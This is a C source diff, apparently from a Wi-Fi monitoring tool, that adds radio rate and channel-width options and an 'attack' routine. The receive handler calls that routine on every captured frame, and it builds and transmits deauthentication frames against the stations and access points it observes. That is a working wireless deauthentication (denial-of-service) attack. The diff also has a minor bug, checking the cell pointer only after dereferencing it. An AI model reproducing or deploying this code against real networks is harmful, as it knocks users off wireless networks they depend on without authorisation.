@@ -31,6 +31,8 @@
 #include "cell.h"
 #include "frametypes.h"
 #include "whitelist.h"
+#include "cfg.h"
+#include "deauth.h"
 
 
 static int _run = 1;
@@ -68,6 +70,27 @@ static struct argp_option options[] = {
 		.flags	= 0,
 		.doc	= "Load whitelist WLIST"
 	},
+	{
+		.name   = "rate",
+		.key	= 'r',
+		.arg    = "RATE | MCS",
+		.flags  = 0,
+		.doc	= "Set legacy RATE [r*500kbit/s] or MCS index"
+	},
+	{
+		.name   = "ht",
+		.key	= 'h',
+		.arg    = "HT",
+		.flags  = 0,
+		.doc	= "Set HT channel width"
+	},
+	{
+		.name   = "gi",
+		.key	= 'g',
+		.arg    = "GI",
+		.flags  = 0,
+		.doc	= "Set GI"
+	},
 	{NULL}
 };
 
@@ -81,31 +104,8 @@ static struct argp argp = {
 	.doc		= doc
 };
 
-static struct cfg {
-	int daemon;
-	struct {
-		u64	freq0;
-		u64	freq1;
-		u64	moep_chan_width;
-		struct {
-			u32	it_present;
-			u8	rate;
-			struct {
-				u8	known;
-				u8	flags;
-				u8	mcs;
-			} mcs;
-		} rt;
-	} wlan;
-	struct {
-		char	*name;
-		size_t	mtu;
-		moep_dev_t dev;
-		int	tx_rdy;
-		int	rx_rdy;
-	} rad;
-	struct whitelist whitelist;
-} cfg;
+
+struct cfg cfg;
 
 static error_t
 parse_opt(int key, char *arg, struct argp_state *state)
@@ -119,6 +119,70 @@ parse_opt(int key, char *arg, struct argp_state *state)
 		strncpy(cfg->whitelist.filename, arg,
 					sizeof(cfg->whitelist.filename));
 		break;
+	case 'r':
+		if (cfg->radio.rt.it_present & BIT(IEEE80211_RADIOTAP_MCS)) {
+			cfg->radio.rt.mcs.known |=
+				IEEE80211_RADIOTAP_MCS_HAVE_MCS;
+			cfg->radio.rt.mcs.mcs = atoi(arg);
+		}
+		else {
+			cfg->radio.rt.it_present |=
+				BIT(IEEE80211_RADIOTAP_RATE);
+			cfg->radio.rt.rate = atoi(arg);
+		}
+		break;
+	case 'h':
+		if (cfg->radio.rt.it_present & BIT(IEEE80211_RADIOTAP_RATE)) {
+			cfg->radio.rt.it_present &=
+				~BIT(IEEE80211_RADIOTAP_RATE);
+			cfg->radio.rt.mcs.known |=
+				IEEE80211_RADIOTAP_MCS_HAVE_MCS;
+			cfg->radio.rt.mcs.mcs = cfg->radio.rt.rate;
+			cfg->radio.rt.rate = 0;
+		}
+		cfg->radio.rt.it_present |= BIT(IEEE80211_RADIOTAP_MCS);
+		cfg->radio.rt.mcs.known |= IEEE80211_RADIOTAP_MCS_HAVE_BW;
+		if (0 == strncasecmp(arg, "ht20", strlen(arg))) {
+			cfg->radio.rt.mcs.flags |= IEEE80211_RADIOTAP_MCS_BW_20;
+			cfg->radio.moep_chan_width = MOEP80211_CHAN_WIDTH_20;
+			break;
+		}
+
+		if (strlen(arg) != strlen("ht40*"))
+			argp_failure(state, 1, errno,
+					"Invalid HT bandwidth: %s", arg);
+
+		if (0 == strncasecmp(arg, "ht40+", strlen(arg))) {
+			cfg->radio.rt.mcs.flags |= IEEE80211_RADIOTAP_MCS_BW_40;
+			cfg->radio.moep_chan_width = MOEP80211_CHAN_WIDTH_40;
+			cfg->radio.freq1 += 10;
+			break;
+		}
+		else if (0 == strncasecmp(arg, "ht40-", strlen(arg))) {
+			cfg->radio.rt.mcs.flags |= IEEE80211_RADIOTAP_MCS_BW_40;
+			cfg->radio.moep_chan_width = MOEP80211_CHAN_WIDTH_40;
+			cfg->radio.freq1 -= 10;
+			break;
+		}
+
+		argp_failure(state, 1, errno, "Invalid HT bandwidth: %s", arg);
+		break;
+	case 'g':
+		if (cfg->radio.rt.it_present & BIT(IEEE80211_RADIOTAP_RATE)) {
+			cfg->radio.rt.it_present &=
+				~BIT(IEEE80211_RADIOTAP_RATE);
+			cfg->radio.rt.mcs.known |=
+				IEEE80211_RADIOTAP_MCS_HAVE_MCS;
+			cfg->radio.rt.mcs.mcs = cfg->radio.rt.rate;
+			cfg->radio.rt.rate = 0;
+		}
+		cfg->radio.rt.it_present |= BIT(IEEE80211_RADIOTAP_MCS);
+		cfg->radio.rt.mcs.known |= IEEE80211_RADIOTAP_MCS_HAVE_GI;
+		if (atoi(arg) == 400)
+			cfg->radio.rt.mcs.flags |= IEEE80211_RADIOTAP_MCS_SGI;
+		else if (atoi(arg) != 800)
+			argp_failure(state, 1, errno, "Invalid GI: %s", arg);
+		break;
 	case ARGP_KEY_ARG:
 		switch (state->arg_num) {
 		case FIX_ARG_IF:
@@ -129,8 +193,8 @@ parse_opt(int key, char *arg, struct argp_state *state)
 			if (freq < 0)
 				argp_failure(state, 1, errno,
 					"Invalid frequency: %lld", freq);
-			cfg->wlan.freq0 = freq;
-			cfg->wlan.freq1 += freq;
+			cfg->radio.freq0 = freq;
+			cfg->radio.freq1 += freq;
 			break;
 		default:
 			argp_usage(state);
@@ -219,40 +283,10 @@ log_status(timeout_t t, u32 overrun, void *data)
 	return 0;
 }
 
-static void
-ieee80211_frame_init_l1hdr(moep_frame_t frame)
-{
-	struct moep80211_radiotap *rt;
-
-	rt = moep_frame_radiotap(frame);
-
-	rt->hdr.it_present = cfg.wlan.rt.it_present;
-	rt->rate = cfg.wlan.rt.rate;
-	rt->mcs.known = cfg.wlan.rt.mcs.known;
-	rt->mcs.flags = cfg.wlan.rt.mcs.flags;
-	rt->mcs.mcs = cfg.wlan.rt.mcs.mcs;
-
-	rt->hdr.it_present |= BIT(IEEE80211_RADIOTAP_TX_FLAGS);
-	rt->tx_flags = IEEE80211_RADIOTAP_F_TX_NOACK;
-}
-
-static void
-ieee80211_frame_init_l2hdr(moep_frame_t frame)
-{
-	struct ieee80211_hdr_gen *hdr;
-
-	hdr = moep_frame_ieee80211_hdr(frame);
-	hdr->frame_control =
-		htole16(IEEE80211_FTYPE_DATA | IEEE80211_STYPE_DATA);
-}
-
 int
 rad_tx(moep_frame_t f)
 {
 	int ret;
-
-	ieee80211_frame_init_l1hdr(f);
-	ieee80211_frame_init_l2hdr(f);
 
 	if (0 > (ret = moep_dev_tx(cfg.rad.dev, f)))
 		LOG(LOG_ERR, "moep80211_tx() failed: %s", strerror(errno));
@@ -359,17 +393,32 @@ static u8 *
 get_bssid(struct ieee80211_hdr_gen *hdr)
 {
 	int fromds, tods;
+	u8 *ret = NULL;
 
 	fromds = hdr->frame_control & IEEE80211_FCTL_FROMDS;
 	tods = hdr->frame_control & IEEE80211_FCTL_TODS;
 
-	if (fromds & tods)
-		return NULL;
-	if (fromds)
-		return hdr->addr2;
-	if (tods)
-		return hdr->addr1;
-	return hdr->addr3;
+	if (fromds & tods) {
+		ret = NULL;
+	}
+	else if (tods) {
+		ret = hdr->addr1;
+	}
+	else if (fromds) {
+		ret = hdr->addr2;
+	}
+	else {
+		ret = hdr->addr3;
+	}
+
+	if (ret) {
+		if (!is_unicast_mac(ret)) {
+
+			ret = NULL;
+		}
+	}
+
+	return ret;
 }
 
 static char *
@@ -417,18 +466,65 @@ get_sta_hwaddr(const struct ieee80211_hdr_gen *hdr)
 	return hwaddr;
 }
 
+static int
+attack(moep_frame_t frame)
+{
+	struct ieee80211_hdr_gen *hdr;
+	moep_frame_t f;
+	u8 *hwaddr, *bssid;
+	sta_t sta;
+	cell_t cell;
+
+	LOG(LOG_ERR, "begin");
+
+	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
+		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
+		return -1;
+	}
+
+	if (!(bssid = get_bssid(hdr)))
+		LOG(LOG_INFO, "bssid not found");
+
+	if (!(hwaddr = get_sta_hwaddr(hdr)))
+		LOG(LOG_INFO, "sta hwaddr not found");
+
+	if (!bssid || !hwaddr) {
+		return -1;
+	}
+
+	cell = cell_find(bssid);
+	sta = sta_find(&cell->sl, hwaddr);
+
+	if (!cell || !bssid)
+		return -1;
+
+	f = deauth(hwaddr, bssid);
+	rad_tx(f);
+	LOG(LOG_ERR, "attack!");
+
+	moep_frame_destroy(f);
+
+	return 0;
+}
+
 static void
 radh(moep_dev_t dev, moep_frame_t frame)
 {
 	(void)dev;
 	struct ieee80211_hdr_gen *hdr;
+	struct moep80211_radiotap *rt;
 	size_t len;
-	u8 *payload, *hwaddr;
+	u8 *payload, *hwaddr, *bssid;
 	char *essid;
-	u8 *transmitter, *receiver, *bssid;
 	cell_t cell;
 	sta_t sta;
 
+	if (!(rt = moep_frame_radiotap(frame))) {
+		LOG(LOG_ERR, "moep_frame_radiotap() failed");
+		goto end;
+	}
+	if (!(rt->hdr.it_present & BIT(IEEE80211_RADIOTAP_RX_FLAGS)))
+		goto end; // driver echo frame
 	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
 		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
 		goto end;
@@ -438,15 +534,12 @@ radh(moep_dev_t dev, moep_frame_t frame)
 		goto end;
 	}
 
-	transmitter = get_transmitter(hdr);
-	receiver = get_receiver(hdr);
 	bssid = get_bssid(hdr);
-
-	if (!is_unicast_mac(bssid))
+	if (!bssid) {
+		LOG(LOG_ERR, "no bssid");
 		goto end;
-
-	if (!bssid)
-		goto end;
+	}
+	LOG(LOG_ERR, "go on");
 
 	if (!(cell = cell_find(bssid)))
 		cell = cell_add(bssid);
@@ -467,6 +560,8 @@ radh(moep_dev_t dev, moep_frame_t frame)
 		sta_update(sta);
 	}
 
+	attack(frame);
+
 	end:
 	moep_frame_destroy(frame);
 	return;
@@ -482,15 +577,15 @@ cfg_init()
 	cfg.rad.name		= "wlan0";
 	cfg.rad.mtu		= 1500;
 
-	cfg.wlan.freq0		= 5180;
-	cfg.wlan.freq1		= 0;
-	cfg.wlan.moep_chan_width= MOEP80211_CHAN_WIDTH_20;
-	cfg.wlan.rt.it_present	= BIT(IEEE80211_RADIOTAP_MCS)
+	cfg.radio.freq0		= 5180;
+	cfg.radio.freq1		= 0;
+	cfg.radio.moep_chan_width= MOEP80211_CHAN_WIDTH_20;
+	cfg.radio.rt.it_present	= BIT(IEEE80211_RADIOTAP_MCS)
 				| BIT(IEEE80211_RADIOTAP_TX_FLAGS);
-	cfg.wlan.rt.mcs.known	= IEEE80211_RADIOTAP_MCS_HAVE_MCS
+	cfg.radio.rt.mcs.known	= IEEE80211_RADIOTAP_MCS_HAVE_MCS
 				| IEEE80211_RADIOTAP_MCS_HAVE_BW;
-	cfg.wlan.rt.mcs.mcs	= 0;
-	cfg.wlan.rt.mcs.flags	= IEEE80211_RADIOTAP_MCS_BW_20;
+	cfg.radio.rt.mcs.mcs	= 0;
+	cfg.radio.rt.mcs.flags	= IEEE80211_RADIOTAP_MCS_BW_20;
 
 	strncpy(cfg.whitelist.filename, DEFAULT_WHITELIST,
 		sizeof(cfg.whitelist.filename));
@@ -540,9 +635,9 @@ main(int argc, char **argv)
 	}
 
 	if (!(cfg.rad.dev = moep_dev_ieee80211_open(cfg.rad.name,
-					cfg.wlan.freq0,
-					cfg.wlan.moep_chan_width,
-					cfg.wlan.freq1, 0,
+					cfg.radio.freq0,
+					cfg.radio.moep_chan_width,
+					cfg.radio.freq1, 0,
 					cfg.rad.mtu))) {
 		LOG(LOG_ERR,"moep80211_rad_open() failed: %s",
 		    strerror(errno));
